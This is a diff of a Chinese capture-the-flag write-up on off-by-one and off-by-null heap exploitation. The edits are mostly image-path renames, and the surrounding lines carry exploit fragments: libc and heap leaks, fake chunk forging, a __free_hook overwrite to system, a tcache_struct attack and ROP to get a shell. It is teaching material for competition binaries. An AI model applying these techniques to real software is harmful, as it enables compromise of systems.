@@ -1,7 +1,7 @@
 
 off by one近期题目详解
 
-- - -
+* * *
 
 # off by one近期题目详解
 
@@ -125,7 +125,7 @@ heap_base=u64(p.recv(6).ljust(8,'\x00'))-0x30a
 leak('heap_base ',heap_base)
 ```
 
-[![](assets/1701072122-cf51570577fefa0c19e9768d2c95e46c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115212929-0109f9a4-83bb-1.png)  
+[![](assets/1701606615-cf51570577fefa0c19e9768d2c95e46c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115212929-0109f9a4-83bb-1.png)  
 然后重置一下idx，然后布置一下chunk(填满tcachebins，然后留出两个chunk用来合并，最后free 的chunk用来泄露libc)
 
 ```plain
@@ -139,7 +139,7 @@ for i in range(7):
 delete(9)
 ```
 
-[![](assets/1701072122-30380042607d29d2bcd14ec14f066a25.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115212945-0ac74654-83bb-1.png)  
+[![](assets/1701606615-30380042607d29d2bcd14ec14f066a25.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115212945-0ac74654-83bb-1.png)  
 泄露一下libc然后，把chunk链入small bin中
 
 ```plain
@@ -157,10 +157,10 @@ delete(11)
 add(12,0xe0,'')
 ```
 
-[![](assets/1701072122-1978865330df484557ea2e1c2d9a9300.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213004-15ac9b96-83bb-1.png)  
+[![](assets/1701606615-1978865330df484557ea2e1c2d9a9300.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213004-15ac9b96-83bb-1.png)  
 然后在下面那个位置伪造chunk来进行合并
 
-[![](assets/1701072122-2d94ab8b0b073aded2ce4743411ba479.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213014-1be109ac-83bb-1.png)
+[![](assets/1701606615-2d94ab8b0b073aded2ce4743411ba479.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213014-1be109ac-83bb-1.png)
 
 ```plain
 pl=p64(0)+p64(0xf1)+p64(heap_base+0x9a0)+p64(heap_base+0x9a0)
@@ -169,14 +169,14 @@ pl+=p64(0xf0)
 edit(7,pl)
 ```
 
-[![](assets/1701072122-9f348879fb2fde576e243c841d36577b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213026-232a5c86-83bb-1.png)  
+[![](assets/1701606615-9f348879fb2fde576e243c841d36577b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213026-232a5c86-83bb-1.png)  
 这里大小为0x100=就是为了方便覆盖:这里是伪造的chunk，fd和bk都为伪造chunk的chunk头，然后伪造了next\_chunk\_pre\_size，然后利用了off by null置空inuse，这里因为把'\\n'变成了'\\x00'，所以这里最后只会保留倒数第三位，所以才要求chunk大小为0x100或者0x200或者0x300
 
 ```plain
 delete(8)
 ```
 
-[![](assets/1701072122-9bc90de2ced3d82c4288d816f239ecc3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213050-31306870-83bb-1.png)  
+[![](assets/1701606615-9bc90de2ced3d82c4288d816f239ecc3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213050-31306870-83bb-1.png)  
 可以看到unsortedbin中已经合并了  
 这时候chunk7还保留了chunk指针，然后我们在合并的unsorted bin 中申请chunk，这时候chunk7和申请的chunk有重叠的部分，我们就可以去修改chunk7来改fd了
 
@@ -194,7 +194,7 @@ pl = p64(0)+p64(0x100)+p64(free_hook)
 edit(7,pl)
 ```
 
-[![](assets/1701072122-fff09e87296afbe7ee5709f2a9b511f7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213111-3d9d2152-83bb-1.png)
+[![](assets/1701606615-fff09e87296afbe7ee5709f2a9b511f7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213111-3d9d2152-83bb-1.png)
 
 ```plain
 add(1,0xf8,'/bin/sh\x00')
@@ -204,7 +204,7 @@ sla('>> ',str(2))
 sla('which note do you want delete?\n',str(1))
 ```
 
-[![](assets/1701072122-240ace20a462468d5c9ee56c05563e0c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213121-440d4648-83bb-1.png)
+[![](assets/1701606615-240ace20a462468d5c9ee56c05563e0c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213121-440d4648-83bb-1.png)
 
 ### exp
 
@@ -454,7 +454,7 @@ unsigned __int64 edit_user()
 
 ### 题目特点
 
-[![](assets/1701072122-4516d8536fc79a442a3610c6cd3248a4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213242-741b2512-83bb-1.png)  
+[![](assets/1701606615-4516d8536fc79a442a3610c6cd3248a4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213242-741b2512-83bb-1.png)  
 这样利用off by one 先去重叠chunk，然后我们再去修改0x10chunk中地址为free\_hook,然后修改为system就可以
 
 ### 详细流程
@@ -465,7 +465,7 @@ unsigned __int64 edit_user()
 add(0x10,'/bin/sh\x00')
 ```
 
-[![](assets/1701072122-41e0978e9851b894ad2b19e829e34439.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213303-8052ed60-83bb-1.png)  
+[![](assets/1701606615-41e0978e9851b894ad2b19e829e34439.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213303-8052ed60-83bb-1.png)  
 然后利用unsorted bin把libc\_base泄露出来
 
 ```plain
@@ -483,7 +483,7 @@ malloc_hook = libc_base + libc.sym['__malloc_hook']
 bin_sh = libc_base + next(libc.search(b'/bin/sh'))
 ```
 
-[![](assets/1701072122-2913be0d66c3c7e56e1b8a81449c24fa.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213316-884b25d2-83bb-1.png)  
+[![](assets/1701606615-2913be0d66c3c7e56e1b8a81449c24fa.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213316-884b25d2-83bb-1.png)  
 然后直接利用off by one 修改size，然后把这个chunk free掉
 
 ```plain
@@ -496,7 +496,7 @@ edit(2,p64(0)*3+p8(0x81))
 delete(3)
 ```
 
-[![](assets/1701072122-f71e9afc0c1acd0fa3c829bb022a61c2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213336-9478687e-83bb-1.png)
+[![](assets/1701606615-f71e9afc0c1acd0fa3c829bb022a61c2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213336-9478687e-83bb-1.png)
 
 ```plain
 add(0x70,p64(0)*8+p64(0x10)+p64(free_hook))
@@ -504,7 +504,7 @@ add(0x70,p64(0)*8+p64(0x10)+p64(free_hook))
 
 利用chunk Overlapping然后将修改地址的索引改成free\_hook,这样就可以直接改hook了
 
-[![](assets/1701072122-3536d63324cdf3e36e3f7f8548bd046a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213355-9fb89d62-83bb-1.png)
+[![](assets/1701606615-3536d63324cdf3e36e3f7f8548bd046a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213355-9fb89d62-83bb-1.png)
 
 ```plain
 edit(4,p64(system))
@@ -513,7 +513,7 @@ delete(0)
 
 直接将free\_hook改成system，然后free(0)就可以
 
-[![](assets/1701072122-f2dc06e9d2ebb213f5c2b2307795b06f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213419-adb566de-83bb-1.png)
+[![](assets/1701606615-f2dc06e9d2ebb213f5c2b2307795b06f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213419-adb566de-83bb-1.png)
 
 ### exp
 
@@ -718,7 +718,7 @@ heap_base=int(r(14),16)-0x2a0
 leak('heap_base ',heap_base)
 ```
 
-[![](assets/1701072122-08019e34b4dc48bf9b45635639b66058.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213539-dd8480de-83bb-1.png)  
+[![](assets/1701606615-08019e34b4dc48bf9b45635639b66058.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213539-dd8480de-83bb-1.png)  
 chunk0从fd位置开始伪装，然后后续chunk1和chunk2
 
 ```plain
@@ -732,21 +732,21 @@ add(0x4f8,'bbbb')
 add(0x4f8,'bbbb')
 ```
 
-[![](assets/1701072122-e079b0bd4514d43c58df728a83fbcedd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213616-f36778a2-83bb-1.png)  
+[![](assets/1701606615-e079b0bd4514d43c58df728a83fbcedd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213616-f36778a2-83bb-1.png)  
 用 off by null 改inuse，伪装chunk
 
 ```plain
 edit(5,0x418,'a'*0x410+p64(0x1880))
 ```
 
-[![](assets/1701072122-f9e8089794ca0d5975c84e199502393d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213629-fb93fe88-83bb-1.png)  
+[![](assets/1701606615-f9e8089794ca0d5975c84e199502393d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213629-fb93fe88-83bb-1.png)  
 然后直接free
 
 ```plain
 delete(6)
 ```
 
-[![](assets/1701072122-159a8ba3e258803490a7d56c5be3b6a7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213642-02e37af6-83bc-1.png)
+[![](assets/1701606615-159a8ba3e258803490a7d56c5be3b6a7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213642-02e37af6-83bc-1.png)
 
 然后直接申请一定0x408大小的chunk，造成两个指针指向同一个chunk
 
@@ -756,7 +756,7 @@ add(0x488,'cccc')
 add(0x488,'cccc')
 ```
 
-[![](assets/1701072122-c99a3827d710869791e694da49bae939.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213701-0eb46c0a-83bc-1.png)  
+[![](assets/1701606615-c99a3827d710869791e694da49bae939.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213701-0eb46c0a-83bc-1.png)  
 然后把这个相同fd的chunk链入large bin，泄露libc
 
 ```plain
@@ -766,24 +766,24 @@ show(1)
 libc_base=u64(p.recv(6).ljust(8,'\x00'))-0x1ff0f0-0x20
 ```
 
-[![](assets/1701072122-0fc7c089e626dba7b2cbc1c2ba54d2f3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213729-1f29b086-83bc-1.png)
+[![](assets/1701606615-0fc7c089e626dba7b2cbc1c2ba54d2f3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213729-1f29b086-83bc-1.png)
 
 ```plain
 delete(2)
 delete(3)
 ```
 
-[![](assets/1701072122-45285316234c545214b0198de9ffdc3d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213741-267784da-83bc-1.png)  
+[![](assets/1701606615-45285316234c545214b0198de9ffdc3d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213741-267784da-83bc-1.png)  
 然后找个比较进的地址去改fd
 
-[![](assets/1701072122-a38980f9995fbe182f3e8f1f0567849d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213752-2cd5648c-83bc-1.png)
+[![](assets/1701606615-a38980f9995fbe182f3e8f1f0567849d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213752-2cd5648c-83bc-1.png)
 
 ```plain
 pl='a'*0x380+p64(0)+p64(0x411)+p64((heap_base+0x10)^(heap_base>>12))
 edit(9,0x400,pl)
 ```
 
-[![](assets/1701072122-7aee00f295608fd0b50be38c010b291a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213803-3321e43c-83bc-1.png)  
+[![](assets/1701606615-7aee00f295608fd0b50be38c010b291a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213803-3321e43c-83bc-1.png)  
 然后利用attack tcache\_struct和IO\_leak泄露栈地址
 
 ```plain
@@ -797,21 +797,21 @@ stack=u64(p.recvuntil('\x7f').ljust(8,'\x00'))-0x120
 leak('stack ',stack)
 ```
 
-[![](assets/1701072122-fe4f9e0f66947ffb24ba3d1bda4e42b2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213817-3ba1b164-83bc-1.png)
+[![](assets/1701606615-fe4f9e0f66947ffb24ba3d1bda4e42b2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213817-3ba1b164-83bc-1.png)
 
-[![](assets/1701072122-22a99765869d2e4aa10b58268931935d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213825-405fb0f2-83bc-1.png)
+[![](assets/1701606615-22a99765869d2e4aa10b58268931935d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213825-405fb0f2-83bc-1.png)
 
-[![](assets/1701072122-531e23beebb4668365165616b755f7a8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213830-435dbbbe-83bc-1.png)  
+[![](assets/1701606615-531e23beebb4668365165616b755f7a8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213830-435dbbbe-83bc-1.png)  
 再利用一次tcache\_struct attack
 
-[![](assets/1701072122-ead68497756ce1f9c8c44c2fff49a438.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213840-49b2f36c-83bc-1.png)
+[![](assets/1701606615-ead68497756ce1f9c8c44c2fff49a438.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213840-49b2f36c-83bc-1.png)
 
 ```plain
 pl=p64(0x1)+p64(0)*14+p64(0x0007000000000000)+p64(0)*0x3f+p64(stack-0x8)
 edit(3,0x408,pl)
 ```
 
-[![](assets/1701072122-a6de057e50724b828edd4cdd416906c9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213850-4f9e67c0-83bc-1.png)  
+[![](assets/1701606615-a6de057e50724b828edd4cdd416906c9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213850-4f9e67c0-83bc-1.png)  
 然后直接再利用
 
 ```plain
@@ -827,14 +827,14 @@ add(0x400,pl)
 
 在add函数的rbp后面构造rop
 
-[![](assets/1701072122-717bfcfbb0504453e37fb02347c6011c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213910-5b6b69c2-83bc-1.png)  
+[![](assets/1701606615-717bfcfbb0504453e37fb02347c6011c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213910-5b6b69c2-83bc-1.png)  
 然后正常退出就能getshell
 
 ```plain
 menu(5)
 ```
 
-[![](assets/1701072122-8b01d6289c79e50a76afd54a3b6230a9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213924-63fcb3c0-83bc-1.png)
+[![](assets/1701606615-8b01d6289c79e50a76afd54a3b6230a9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231115213924-63fcb3c0-83bc-1.png)
 
 ### exp
 
@@ -963,8 +963,8 @@ menu(5)
 itr()
 ```
 
-![](assets/1701072122-c1a690c3008373b105f447e452f0cfec.gif)pwn1.zip (0.863 MB) [下载附件](https://xzfile.aliyuncs.com/upload/affix/20231115214142-b638ffa4-83bc-1.zip)
+![](assets/1701606615-d03a5e4b40ff92d0dd5ebf3823a3802c.gif)pwn1.zip (0.863 MB) [下载附件](https://xzfile.aliyuncs.com/upload/affix/20231115214142-b638ffa4-83bc-1.zip)
 
-![](assets/1701072122-c1a690c3008373b105f447e452f0cfec.gif)pwn2.zip (0.758 MB) [下载附件](https://xzfile.aliyuncs.com/upload/affix/20231115214400-07ebb120-83bd-1.zip)
+![](assets/1701606615-d03a5e4b40ff92d0dd5ebf3823a3802c.gif)pwn2.zip (0.758 MB) [下载附件](https://xzfile.aliyuncs.com/upload/affix/20231115214400-07ebb120-83bd-1.zip)
 
-![](assets/1701072122-c1a690c3008373b105f447e452f0cfec.gif)pwn3.zip (0.907 MB) [下载附件](https://xzfile.aliyuncs.com/upload/affix/20231115214402-096a04ac-83bd-1.zip)
+![](assets/1701606615-d03a5e4b40ff92d0dd5ebf3823a3802c.gif)pwn3.zip (0.907 MB) [下载附件](https://xzfile.aliyuncs.com/upload/affix/20231115214402-096a04ac-83bd-1.zip)
